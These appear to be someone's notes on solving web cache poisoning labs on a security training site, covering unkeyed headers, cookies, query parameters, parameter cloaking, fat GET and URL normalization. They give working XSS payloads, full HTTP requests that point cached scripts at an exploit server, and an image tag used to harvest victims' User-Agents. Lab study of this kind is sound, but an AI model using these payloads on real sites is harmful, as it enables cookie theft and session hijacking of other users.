# Web Cache Poisoning

## Unkeyed header
- Use param miner extension to find headers
  - Found that x-Forwarded-Host is reflected in the response
- Used this payload to exploit: `X-Forwarded-Host: "></script><script>alert(document.cookie)</script><script>`

## Unkeyed cookie
- Cookies are not in cache key 
  - Cache key = predefined request components
- Param miner found fehost cookie
- Used this payload to exploit: `Cookie: fehost=x")</script><script>alert(1)</script><script>`

## Multiple headers
- Param miner found X-Forwarded-Proto header
- If you use this it adds a redirect to a url that includes the web dir in the original request
- The website also allowed for X-Forwarded-Host which would change the link
- I sent this request to tracking.js:
```http
GET /resources/js/tracking.js HTTP/2Host: 0a5200060335f34b817d667700130056.web-security-academy.net
Cookie: session=CMTcrvpZEooQ7J39QXbx1HYOk8OlhNwC
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0a5200060335f34b817d667700130056.web-security-academy.net/?%3Cscript%3Ealert(1)%3C/script%3E
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a7a00fd0366f3b28166658101d300c4.exploit-server.net
```
- and got this response:
```
HTTP/2 302 Found
Location: https://exploit-0a7a00fd0366f3b28166658101d300c4.exploit-server.net/resources/js/tracking.js
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 3
X-Cache: hit
Content-Length: 0
```
- The X-Cache: hit means that the new link was stored
- The payload on the exploit server was: alert(document.cookie)

- Unknown header
-- Param miner found X-Host header
-- -- This edited the tracking.js link
-- -- Changed exploit server to: /resources/js/tracking.js
-- -- added the payload alert(document.cookie)
-- This works for me, but no solve
-- Found that the Vary header in the response is set to User-Agent
-- The comments allowed for HTML so used: <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
-- -- This made the victim interact with the server
-- -- The victims User-Agent was in the access log
-- Changed the User-Agent in Burp and resent the request

- Unkeyed query string
-- You have to add the Origin header to test since it was a cache buster
-- --  You need a cache buster when you constantly get hits and no misses
-- This solves the lab: /?test=x'/><script>alert(1)</script><

- Unkeyed query parameter
-- utm parameter was Unkeyed
-- This is the payload: /?utm_content='/><script>alert(1)</script><
-- Again Origin was cache buster
-- Take off Origin and click send until it appears

- Parameter cloaking
-- utm parameter was allowed 
-- The geolocate.js was using callback
-- Used this to cloak the change in callback: /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
-- -- Cloaking was needed to avoid the cache keys

- fat GET
-- Found callback in geolocate.js
-- Used this request to get the alert
------------------------------------------------------------------------------------------
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a26003f0429f29e803576e000d8002b.web-security-academy.net
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0a26003f0429f29e803576e000d8002b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Http-Method-Override: POST
Content-Length: 17

callback=alert(1)
------------------------------------------------------------------------------------------

- URL Normalization
-- 404 error reflected url
-- You had to poison and immediately send the url to the victim
-- This was the url: https://0a44009203ac0bc18de49d8000e1004b.web-security-academy.net/x</p><script>alert(1)</script><p>
